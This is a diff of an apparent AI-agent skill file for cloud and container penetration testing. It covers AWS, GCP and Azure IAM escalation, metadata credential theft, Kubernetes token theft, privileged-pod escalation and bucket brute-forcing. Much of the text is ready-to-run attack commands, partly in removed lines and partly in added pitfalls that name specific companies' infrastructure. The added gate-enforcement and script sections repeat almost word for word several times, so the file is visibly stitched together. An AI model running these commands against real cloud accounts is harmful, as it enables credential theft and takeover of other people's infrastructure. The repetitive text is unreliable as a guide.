@@ -1,6 +1,6 @@
 ---
 name: ctest
-version: 1.0.1
+version: 1.1.0
 description: "Cloud and container penetration testing framework with 5 gated phases covering AWS/GCP/Azure IAM, container escape, K8s exploitation, and serverless abuse."
 tags: [cloud, aws, gcp, azure, kubernetes, container, iam, serverless, pentest]
 trigger: "cloud pentest, aws pentest, gcp pentest, azure pentest, kubernetes pentest, container escape, iam escalation, cloud security"
@@ -19,6 +19,23 @@ Structured 5-phase workflow for engagements where cloud infrastructure is the pr
 
 ```
 Phase 1: Scope & Discovery → Phase 2: IAM & Access → Phase 3: Service Exploitation → Phase 4: Container & Orchestration → Phase 5: Reporting
+```
+
+## Scripts
+
+Scripts in `~/.hermes/skills/security/ctest/scripts/`:
+- **state_manager.py**: `init_state()`, `status()`, `advance_phase()`, `add_finding()`, `mark_na()`, `abandon()`, `should_abandon()`
+- **gate_check.py**: `check_gate(workdir, phase)`, `print_gate_status(result)` — run before advancing
+
+### Gate Enforcement (MANDATORY before `next`)
+
+```python
+import sys, os
+sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/ctest/scripts"))
+from gate_check import check_gate, print_gate_status
+
+result = check_gate(".", phase=None)
+print_gate_status(result)
 ```
 
 ## Commands
@@ -167,351 +184,37 @@ Your approach fundamentally changes based on access level. Before starting Phase
 
 ---
 
-## Phase 1: Scope & Discovery
 
-### Gate: cloud provider confirmed, account/project enumerated, external attack surface mapped
+## Phases (load reference for full methodology)
 
-**First: run proven patterns (10 min) — see `references/proven-patterns.md`**
-7 high-hit-rate checks before systematic discovery. If any hits (leaked keys, public storage with secrets) → pivot immediately to Phase 2 with found credentials.
+| Phase | Gate | Reference |
+|-------|------|-----------|
+| 1 Scope & Discovery | cloud accounts enumerated, services mapped, network topology documented | `references/phase1-scope-discovery.md` |
+| 2 IAM & Access | IAM policies reviewed, privilege escalation paths mapped, cross-account trust analyzed | `references/phase2-iam-access.md` |
+| 3 Service Exploitation | exposed services exploited, SSRF→metadata tested, secrets from storage extracted | `references/phase3-service-exploitation.md` |
+| 4 Container & Orchestration | container escapes tested, K8s RBAC abused, pod-to-node pivots attempted | `references/phase4-container-orchestration.md` |
+| 5 Reporting | report delivered with attack path diagrams | see below |
 
-**Prioritization by scope type:**
-- **External:** Credential Discovery (#5) first → then Service Discovery (#3) → then External Attack Surface (#4). You need creds or public resources before anything else matters.
-- **Authenticated:** Account/Project Enumeration (#2) first → then Service Discovery (#3). You already have access, map what's reachable.
-- **Internal:** All techniques in parallel — you have visibility, be systematic.
+**Additional references:**
+- CI/CD pipeline attacks: `references/cicd-pipeline-attacks.md` (load during Phase 3 if pipelines in scope)
+- Firebase Auth testing: `references/firebase-auth-testing.md` (load when Firebase Auth detected — covers email-link flow, referer bypass, session emulator pattern)
 
-**Techniques:**
-
-1. **Provider Identification:**
-   ```bash
-   # DNS indicators
-   dig +short CNAME target.com  # *.amazonaws.com, *.googleusercontent.com, *.azurewebsites.net
-   # IP range lookup
-   whois <IP> | grep -i "amazon\|google\|microsoft"
-   # HTTP headers
-   curl -sI https://target.com | grep -i "x-amz\|x-goog\|x-ms\|server"
-   ```
-
-2. **Account/Project Enumeration:**
-   - AWS: account ID from S3 bucket policies, STS error messages, CloudFront distributions
-   - GCP: project ID from APIs, Firebase configs, GCS bucket names
-   - Azure: tenant ID from `.well-known/openid-configuration`, subscription from error messages
-
-3. **Service Discovery:**
-   ```bash
-   # Multi-cloud resource enumeration (S3, Azure Blobs, GCS in one pass)
-   # https://github.com/initstring/cloud_enum
-   cloud_enum -k <keyword> -k <company> -k <product> --disable-gcp  # or --disable-aws, --disable-azure
-   # Discovers: open buckets, Azure apps, GCP projects, storage containers
-
-   # S3/GCS/Blob enumeration (manual)
-   aws s3 ls s3://<bucket> --no-sign-request
-   gsutil ls gs://<bucket>
-
-   # PITFALL: Some buckets have different ACLs via CNAME vs direct S3 URL
-   # e.g., assets.target.com (CNAME → bucket.s3.amazonaws.com) may allow ListBucket
-   # but s3://bucket directly returns AccessDenied. Always test BOTH paths.
-   curl -s 'https://assets.target.com/'  # via CNAME
-   aws s3 ls s3://bucket-name --no-sign-request  # direct
-
-   # Cloud metadata from SSRF (if web app in scope)
-   curl http://169.254.169.254/latest/meta-data/
-   curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
-   curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-   ```
-
-4. **External Attack Surface:**
-   - Exposed storage buckets (public read/write)
-   - Exposed databases (RDS/CloudSQL/CosmosDB with public endpoints)
-   - Exposed management interfaces (console, API gateways)
-   - Serverless function URLs (Lambda URLs, Cloud Functions, Azure Functions)
-   - Container registries (ECR, GCR, ACR with public access)
-
-5. **Credential Discovery:**
-   - GitHub/GitLab code search for access keys
-   - `.env` files, terraform state files, CI/CD configs
-   - JS bundles with embedded cloud credentials
-   - Docker images with baked-in secrets
-   - **GitHub OSINT for leaked session tokens** (see `references/github-credential-osint.md`)
-
-**Reference:** `references/aws-attack-paths.md`, `references/gcp-attack-paths.md`, `references/azure-attack-paths.md`
-
-**Cross-reference:** ptest `references/cloud-infrastructure-enumeration.md` for passive enumeration techniques.
-
-**Cross-skill triggers from ctest:**
-- Web app found on cloud infra → invoke `ptest` for web pentest
-- API gateway discovered → invoke `atest` for API-specific testing
-- Container with mobile backend → invoke `mtest` if app in scope
-- SSRF to internal services → feed endpoints back to `ptest`/`atest`
-- Geo-blocked cloud services → see ptest `references/geo-restriction-bypass.md`
-
-**Cross-skill triggers INTO ctest (reverse):**
-- SSRF found in ptest/atest → run ctest Phase 1 metadata checks (169.254.169.254) + Phase 3 compute exploitation
-- Cloud credentials leaked via web app (config.js, .env, source maps) → run ctest Phase 2 IAM analysis with found creds
-- S3/GCS URLs in API responses → run ctest Phase 3 storage enumeration on those buckets
-- Docker registry URL found in mtest/ptest → run ctest Phase 4 registry access checks
+**Usage:** `skill_view(name='ctest', file_path='references/phase1-scope-discovery.md')` when entering that phase.
 
 ---
 
-## Phase 2: IAM & Access Analysis
+## Cross-Skill Handoffs
 
-### Gate: identity enumeration complete, privilege level assessed, escalation paths identified
+**Into ctest (from other skills):**
+- ptest/atest finds SSRF → invoke ctest Phase 3 (cloud metadata, internal services)
+- ptest finds cloud storage URLs → invoke ctest Phase 1 (S3/GCS/Blob misconfig)
+- scode finds hardcoded AWS/GCP creds → invoke ctest Phase 2 (IAM access analysis)
 
-**Techniques:**
-
-1. **Identity Enumeration:**
-   ```bash
-   # AWS — who am I?
-   aws sts get-caller-identity
-   aws iam list-users
-   aws iam list-roles
-   aws iam list-attached-user-policies --user-name <user>
-
-   # GCP
-   gcloud auth list
-   gcloud projects get-iam-policy <project>
-   gcloud iam service-accounts list
-
-   # Azure
-   az account show
-   az ad user list
-   az role assignment list
-   ```
-
-2. **Policy Analysis:**
-   - Overly permissive policies (`*:*`, `s3:*`, `iam:PassRole`)
-   - Cross-account trust relationships
-   - Service-linked roles with excessive permissions
-   - Conditional policies that can be bypassed
-
-3. **Privilege Escalation Paths:**
-   - AWS: `iam:CreatePolicyVersion`, `iam:AttachUserPolicy`, `iam:PassRole` + `lambda:CreateFunction`, `sts:AssumeRole` chains
-   - GCP: `setIamPolicy`, `actAs` on service accounts, `deployments.create`
-   - Azure: `Microsoft.Authorization/roleAssignments/write`, custom role abuse
-
-4. **Federation & SSO:**
-   - SAML provider misconfigurations
-   - OIDC trust with overly broad conditions
-   - Cross-account role assumption without external ID
-   - Workload identity federation abuse
-
-5. **Automated Enumeration:**
-   ```bash
-   # AWS
-   enumerate-iam  # or pacu
-   python3 pacu.py
-   # GCP
-   gcp_enum.sh  # custom or gcpbucketbrute
-   # Azure
-   azurehound  # or ROADtools
-   roadrecon gather
-   ```
-
-**Prioritization by access level:**
-- **Leaked keys (AKIA/ASIA):** Identity Enumeration (#1) → Policy Analysis (#2) → Escalation (#3). Determine what the key can do before trying to escalate.
-- **Compromised user:** Federation & SSO (#4) first (can you pivot to other accounts?) → then Policy Analysis (#2) → Escalation (#3).
-- **Service account:** Skip user enumeration. Go straight to Policy Analysis (#2) → check what services the SA can access → Escalation (#3).
-
-**Reference:** `references/iam-escalation-patterns.md`
-
-**Cross-reference:** ptest `references/cloud-privilege-escalation.md` for post-compromise escalation.
-
----
-
-## Phase 3: Service Exploitation
-
-### Gate: at least 3 service categories tested, storage/compute/network assessed
-
-**Prioritization by what you have:**
-- **Read-only access:** Storage first (S3/GCS/Blob enumeration, public snapshots) → Database (RDS snapshots, Firestore rules) → Secrets Manager/Parameter Store. You're looking for data exposure.
-- **Limited write access:** Serverless first (Lambda env vars, event injection, layer poisoning) → Compute (user data scripts, instance profiles) → Network. You're looking for code execution.
-- **Broad access:** Network first (VPC peering, security groups, private endpoints) → then sweep all categories. You're mapping blast radius.
-
-**Techniques:**
-
-1. **Storage Misconfigurations:**
-   - Public buckets with sensitive data (PII, backups, logs, terraform state)
-   - Bucket policy allowing `s3:PutObject` (write access)
-   - Versioning enabled with deleted secrets recoverable
-   - Cross-account access via bucket policies
-   - Signed URL generation with long expiry
-   ```bash
-   # S3 policy and ACL check
-   aws s3api get-bucket-policy --bucket <name> 2>/dev/null
-   aws s3api get-bucket-acl --bucket <name>
-   # List with no auth (public bucket)
-   aws s3 ls s3://<name> --no-sign-request
-   # Recover deleted secrets via versioning
-   aws s3api list-object-versions --bucket <name> --prefix "secrets"
-   ```
-
-2. **Compute Exploitation:**
-   - EC2/VM metadata SSRF (IMDSv1 vs v2)
-   - Instance profile credential theft
-   - User data scripts with secrets
-   - SSM command execution on managed instances
-   - Snapshot access (public AMIs/images with secrets)
-
-   **IMDSv2 Bypass Techniques (when IMDSv1 is disabled):**
-   ```bash
-   # IMDSv2 requires PUT to get token first (hop limit = 1 by default)
-   TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
-   curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-
-   # Bypass 1: SSRF that follows redirects can't get token (PUT not forwarded)
-   # But: if SSRF allows custom method → PUT to token endpoint, then GET with token
-
-   # Bypass 2: Container-level access (hop limit doesn't apply inside container)
-   # ECS tasks / Docker containers on EC2 can reach IMDS even with hop=1
-   # because the request originates from the instance itself
-   curl -s "http://169.254.169.254/latest/meta-data/"  # works from inside container
-
-   # Bypass 3: ECS Task metadata (different endpoint, no IMDSv2 protection)
-   # Inside ECS container:
-   curl -s "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"  # env var set by ECS
-   curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
-
-   # Bypass 4: If hop limit raised to 2+ (misconfiguration)
-   # SSRF through one proxy hop can reach IMDS
-   aws ec2 describe-instances --query 'Reservations[].Instances[].MetadataOptions' # check HttpPutResponseHopLimit
-
-   # Bypass 5: DNS rebinding
-   # Point attacker domain to 169.254.169.254 after initial DNS check passes
-   # Works if SSRF validates hostname but not IP at request time
-   ```
-   **Key insight:** IMDSv2 blocks most SSRF but NOT container-level access. If you have code execution inside a container on EC2, IMDS is still reachable.
-   ```bash
-   # Public snapshots with your account's data
-   aws ec2 describe-snapshots --restorable-by-user-ids all --owner-ids <account_id>
-   # User data (often contains bootstrap secrets)
-   aws ec2 describe-instance-attribute --instance-id <id> --attribute userData | jq -r '.UserData.Value' | base64 -d
-   # SSM command execution
-   aws ssm send-command --instance-ids <id> --document-name "AWS-RunShellScript" --parameters 'commands=["id"]'
-   ```
-
-3. **Serverless Abuse:**
-   - Lambda/Cloud Function environment variable extraction
-   - Event injection (S3 trigger, SNS, API Gateway)
-   - Layer poisoning
-   - Timeout/memory abuse for crypto mining
-   - Cold start credential caching
-   ```bash
-   # Lambda env vars (often contain DB creds, API keys)
-   aws lambda get-function --function-name <name> | jq '.Configuration.Environment'
-   aws lambda list-functions | jq '.Functions[].FunctionName'
-   # GCP Cloud Function source
-   gcloud functions describe <name> --format='value(sourceArchiveUrl)'
-   ```
-
-4. **Database & Secrets:**
-   - RDS/CloudSQL public snapshots
-   - Secrets Manager/Parameter Store enumeration
-   - DynamoDB/Firestore without fine-grained access
-   - Redis/Memcached exposed without auth
-   ```bash
-   # Secrets Manager enumeration
-   aws secretsmanager list-secrets
-   aws ssm describe-parameters
-   aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
-   # RDS public access check
-   aws rds describe-db-instances | jq '.DBInstances[] | select(.PubliclyAccessible==true) | .Endpoint'
-   ```
-
-5. **Network:**
-   - VPC peering misconfigurations
-   - Security group/NSG overly permissive rules
-   - Transit gateway route leaks
-   - Private link/endpoint exposure
-   - DNS exfiltration via Route53/Cloud DNS
-
-**Reference:** `references/serverless-abuse.md`, `references/cicd-pipeline-attacks.md`
-
----
-
-## Phase 4: Container & Orchestration
-
-### Gate: container runtime assessed, K8s API tested (if present), registry access checked
-
-**Skip criteria:** If the target has no containers/K8s (pure serverless, VM-only, or PaaS-only), skip this phase entirely. Indicators that Phase 4 applies:
-- EKS/GKE/AKS clusters found in Phase 1 or Phase 3
-- Container registry (ECR/GCR/ACR) discovered
-- Kubernetes-related subdomains or ports (6443, 10250, 2379)
-- Docker/containerd references in instance metadata or user data
-- Istio/Envoy headers in HTTP responses
-
-**If skipping:** Move directly to Phase 5. Document "No container/orchestration infrastructure identified" in the report.
-
-**Techniques:**
-
-1. **Kubernetes API:**
-   ```bash
-   # Unauthenticated access
-   curl -sk https://<k8s-api>:6443/api/v1/namespaces
-   curl -sk https://<k8s-api>:6443/version
-   # With token
-   kubectl --token=$TOKEN --server=https://<api> get pods -A
-   kubectl auth can-i --list
-   ```
-
-2. **Container Escape:**
-   - Privileged containers (`--privileged`)
-   - Host PID/network namespace
-   - Mounted Docker socket (`/var/run/docker.sock`)
-   - `SYS_ADMIN` capability + cgroup escape
-   - Kernel exploits (CVE-2022-0185, CVE-2024-21626)
-
-3. **Registry Access:**
-   ```bash
-   # ECR
-   aws ecr get-login-password | docker login --username AWS --password-stdin <account>.dkr.ecr.<region>.amazonaws.com
-   aws ecr describe-repositories
-   # GCR
-   gcloud container images list --repository=gcr.io/<project>
-   # ACR
-   az acr repository list --name <registry>
-   ```
-
-4. **Service Mesh & Network Policies:**
-   - Istio AuthorizationPolicy gaps
-   - Missing NetworkPolicies (pod-to-pod unrestricted)
-   - Sidecar injection disabled on sensitive namespaces
-   - mTLS in PERMISSIVE mode
-
-5. **Secrets in Cluster:**
-   ```bash
-   kubectl get secrets -A -o json | jq '.items[].data | keys'
-   # Mounted secrets in pods
-   kubectl exec <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
-   # etcd direct access (if exposed)
-   etcdctl get / --prefix --keys-only
-   ```
-
-6. **RBAC Escalation & Token Theft:**
-   ```bash
-   # Check what current SA can do
-   kubectl auth can-i --list
-   kubectl auth can-i create pods
-   kubectl auth can-i create clusterrolebindings
-   # Escalate via pod creation (mount privileged SA)
-   kubectl run pwn --image=alpine --overrides='{"spec":{"serviceAccountName":"admin-sa","containers":[{"name":"pwn","image":"alpine","command":["sleep","3600"]}]}}'
-   # EKS IRSA token theft (from inside pod)
-   cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token
-   # GKE Workload Identity token
-   curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
-   # Azure Managed Identity
-   curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
-   ```
-
-7. **Supply Chain:**
-   - Image provenance (unsigned images, no admission controller)
-   - Helm chart values with secrets
-   - CI/CD pipeline credentials in cluster
-   - Admission webhook bypass
-
-**Reference:** `references/container-escape.md`, `references/k8s-cluster-attacks.md`
-
-**Cross-reference:** ptest `references/kubernetes-container-attacks.md`, `references/kubernetes-management-tooling.md`
-
----
+**Out of ctest (to other skills):**
+- Cloud web app found via recon → hand to ptest (standard web pentest)
+- API gateway discovered → hand to atest (API-focused testing)
+- Container has source code → hand to scode (code review)
+- K8s CronJob runs exploitable binary → hand to xdev (exploit dev)
 
 ## Attack Path Chaining
 
@@ -627,6 +330,129 @@ After finding something, check if it unlocks:
 
 ---
 
+## Gate Enforcement (MANDATORY before `next`)
+
+Before advancing any phase, run the gate checker:
+
+```python
+import sys, os
+sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/ctest/scripts"))
+from gate_check import check_gate, print_gate_status
+
+result = check_gate(".", phase=None)  # checks current phase from state.yaml
+print_gate_status(result)
+# Only advance if result["passed"] is True
+```
+
+If gate check fails, fix unmet items before advancing. Override only with explicit user justification.
+
+## Script Invocation
+
+Scripts are in `~/.hermes/skills/security/ctest/scripts/`. Invoke via `execute_code`.
+
+```python
+import sys, os
+sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/ctest/scripts"))
+import state_manager
+
+# Initialize
+state_manager.init_state(".", "Target Cloud", provider="aws",
+    scope_type="authenticated", access_level="leaked_keys",
+    target_assets=["123456789012"])
+
+# Status / Advance / Finding / Abandon
+state_manager.status(".")
+state_manager.advance_phase(".")
+state_manager.add_finding(".", "CTEST-001", "Public S3 bucket", "High", "S3", "arn:aws:s3:::bucket")
+state_manager.mark_na(".", 4, "No containers in scope")
+state_manager.abandon(".", "Credentials revoked")
+```
+
+---
+
+## Gate Enforcement (MANDATORY before `next`)
+
+Before advancing any phase, run the gate checker:
+
+```python
+import sys, os
+sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/ctest/scripts"))
+from gate_check import check_gate, print_gate_status
+
+result = check_gate(".", phase=None)  # checks current phase from state.yaml
+print_gate_status(result)
+# Only advance if result["passed"] is True
+```
+
+If gate check fails, fix unmet items before advancing. Override only with explicit user justification.
+
+## Script Invocation
+
+Scripts are in `~/.hermes/skills/security/ctest/scripts/`. Invoke via `execute_code`.
+
+**state_manager.py — engagement lifecycle:**
+```python
+import sys, os
+sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/ctest/scripts"))
+import state_manager
+
+workdir = "."
+state_manager.init_state(workdir, "Target Cloud", provider="aws",
+    scope_type="authenticated", access_level="leaked_keys",
+    target_assets=["arn:aws:iam::123456789012:*"])
+state_manager.status(workdir)
+state_manager.advance_phase(workdir)
+state_manager.add_finding(workdir, "CTEST-001", "Public S3 bucket", "High", "S3", "arn:aws:s3:::backup-prod")
+state_manager.mark_na(workdir, 4, "No K8s/containers in scope")
+state_manager.abandon(workdir, "Credentials revoked mid-test")
+should, reason = state_manager.should_abandon(workdir, budget_hours=8)
+```
+
+## Gate Enforcement (MANDATORY before `next`)
+
+Before advancing any phase, run the gate checker:
+
+```python
+import sys, os
+sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/ctest/scripts"))
+from gate_check import check_gate, print_gate_status
+
+result = check_gate(".", phase=None)  # checks current phase from state.yaml
+print_gate_status(result)
+# Only advance if result["passed"] is True
+```
+
+## Script Invocation
+
+Scripts are in `~/.hermes/skills/security/ctest/scripts/`. Invoke via `execute_code`.
+
+**state_manager.py — engagement lifecycle:**
+```python
+import sys, os
+sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/ctest/scripts"))
+import state_manager
+
+state_manager.init_state(".", "Target Cloud", provider="aws", scope_type="authenticated",
+    access_level="leaked_keys", target_assets=["arn:aws:iam::123456789:role/target"])
+state_manager.status(".")
+state_manager.advance_phase(".")
+state_manager.add_finding(".", "CTEST-001", "Public S3 bucket", "High", "S3", "arn:aws:s3:::target-backups")
+state_manager.mark_na(".", 4, "No K8s/containers in scope")
+state_manager.abandon(".", "Credentials revoked mid-test")
+```
+
+---
+
+## Pitfalls
+
+- AWS metadata v2 (IMDSv2) requires PUT with token header — simple GET to 169.254.169.254 won't work
+- K8s service account tokens in pods ≠ cluster-admin — check RBAC before assuming full access
+- Container escape via /var/run/docker.sock only works if socket is mounted (check `ls -la /var/run/`)
+- Terraform state files contain secrets in plaintext — check S3 buckets for .tfstate before moving on
+- GCP metadata requires `Metadata-Flavor: Google` header — missing it returns 403
+- Azure IMDS requires `Metadata: true` header — curl without it looks like the endpoint doesn't exist
+- EKS/GKE managed clusters patch fast — kernel exploits rarely work, focus on misconfig/RBAC instead
+
 ## Mandatory Tools
 
 | Phase | Mandatory | Recommended |
@@ -636,6 +462,44 @@ After finding something, check if it unlocks:
 | 3 — Services | aws-cli/gcloud/az, nmap | s3scanner, CloudMapper, Cartography |
 | 4 — Containers | kubectl, docker/crictl | kubeaudit, kube-hunter, trivy |
 | 5 — Reporting | (writing phase) | — |
+
+## Gate Enforcement (MANDATORY before `next`)
+
+Before advancing any phase, run the gate checker:
+
+```python
+import sys, os
+sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/ctest/scripts"))
+from gate_check import check_gate, print_gate_status
+
+result = check_gate(".", phase=None)  # checks current phase from state.yaml
+print_gate_status(result)
+# Only advance if result["passed"] is True
+```
+
+If gate check fails, fix unmet items before advancing. Override only with explicit user justification.
+
+## Script Invocation
+
+Scripts are in `~/.hermes/skills/security/ctest/scripts/`. Invoke via `execute_code`.
+
+**state_manager.py — engagement lifecycle:**
+```python
+import sys, os
+sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/ctest/scripts"))
+import state_manager
+
+workdir = "."
+state_manager.init_state(workdir, "Target Cloud", provider="aws",
+    scope_type="authenticated", access_level="compromised_user",
+    target_assets=["arn:aws:iam::123456789012:role/dev-role"])
+
+state_manager.status(workdir)
+state_manager.advance_phase(workdir)
+state_manager.add_finding(workdir, "CTEST-001", "Public S3 bucket", "High", "S3", "arn:aws:s3:::backup-prod")
+state_manager.mark_na(workdir, 4, "No containers in scope")
+state_manager.abandon(workdir, "Credentials rotated mid-test")
+```
 
 ---
 
@@ -694,7 +558,14 @@ After finding something, check if it unlocks:
 - **Region Awareness** — test ALL regions, not just the primary. Resources hidden in unused regions are a common finding.
 - **No Persistence** — document persistence techniques but do NOT deploy backdoors without explicit authorization.
 - **Evidence Preservation** — screenshot/log everything before remediation discussions. Cloud resources can be deleted quickly.
+- **Alibaba Cloud metadata** — uses `100.100.100.200` (NOT 169.254.169.254). Requires no special headers (unlike GCP/Azure). RAM security credentials at `/latest/meta-data/ram/security-credentials/`.
+- **Alibaba OSS buckets** — format `{name}.{region}.aliyuncs.com`. Common regions: oss-ap-southeast-1, oss-cn-hangzhou, oss-cn-shanghai. POST to OSS returns XML `MethodNotAllowed` with `webapp-origin.marmot-cloud.com` HostId (confirms static bucket). Always test via CNAME too — different ACLs possible.
+- **Ant Group/Alipay infrastructure** — Spanner (internal LB), Tengine (CDN edge), ESA (edge security). `x-fc-request-id` = Function Compute, `x-oss-request-id` = OSS. See ptest `references/alibaba-cloud-infrastructure.md` for full fingerprinting guide.
 - **Geo-blocking** — SEA companies (Grab, Gojek, Tokopedia, OVO) commonly geo-restrict API gateways. All endpoints return 502 from outside the region. If you hit consistent 502s across all API paths, test from a regional VPN before concluding the service is down. Static assets (CDN, S3 via CNAME) often remain accessible globally even when APIs are blocked.
 - **Cost Awareness** — cloud pentesting can accidentally generate costs (ScoutSuite scanning all regions, large S3 sync, spinning up compute for PoC). If using client credentials, monitor billing. Prefer `--dry-run` flags and `--max-keys`/`--limit` on enumeration. Never run crypto mining PoCs on client accounts.
 - **S3 ListBucket via CNAME** — some buckets allow ListBucket only through their CNAME (e.g., `subdomain.target.com` → bucket) but deny direct `bucket.s3.amazonaws.com` access. Always test both paths. A 200 on listing doesn't mean GetObject works — test read/write separately.
-- **cloud_enum on macOS** — the pip-installed `cloud_enum` may fail with "Cannot access mutations file" because it looks for `fuzz.txt` relative to the binary, not the package. Fix: find the package dir (`pip3 show cloud_enum | grep Location`) and run from there, or symlink the enum_tools directory.
+- **cloud_enum on macOS** — the pip-installed `cloud_enum` may fail with "Cannot access mutations file" because it looks for `fuzz.txt` relative to the binary, not the package. Fix: find the package dir (`pip3 show cloud_enum | grep Location`) and run from there, or symlink the enum_tools directory. If cloud_enum fails, use manual GCS bucket brute-force: `curl -sk "https://storage.googleapis.com/BUCKET" -o /dev/null -w "%{http_code}"` (404=doesn't exist, 403=exists+ACL'd, 401=exists+needs auth). Test keywords: {company}, {project}-prd/stg/dev, {product}-backup/logs/data.
+- **macOS port 5000** — AirPlay Receiver occupies port 5000. Use 5001+ for Flask/web tools. Or disable AirPlay in System Settings > General > AirDrop & Handoff.
+- **Firebase API key referer restriction** — Firebase Identity Toolkit returns 403 "Requests from referer <empty> are blocked" without Referer header. Always add `-H "Referer: https://target.domain/"` to all identitytoolkit.googleapis.com calls.
+- **CDN path traversal → origin disclosure** — Fastly/Varnish/CloudFront may not normalize `%2e%2e` (URL-encoded `..`). When CDN can't resolve the traversed path, it often generates a 302 redirect to the internal origin hostname, leaking backend infrastructure. Test: `curl -D- "https://cdn-target.com/v1/any/%2e%2e/test"` — if Location header reveals a different domain (e.g., `api-origin.target.internal`), you've found the origin. Follow-up: DNS enumerate the leaked domain for admin panels, staging, internal services. Chain: if the redirect is to a domain you control or can influence → open redirect. This pattern is common on GCP (Google Frontend + Fastly) and AWS (CloudFront + ALB).
+
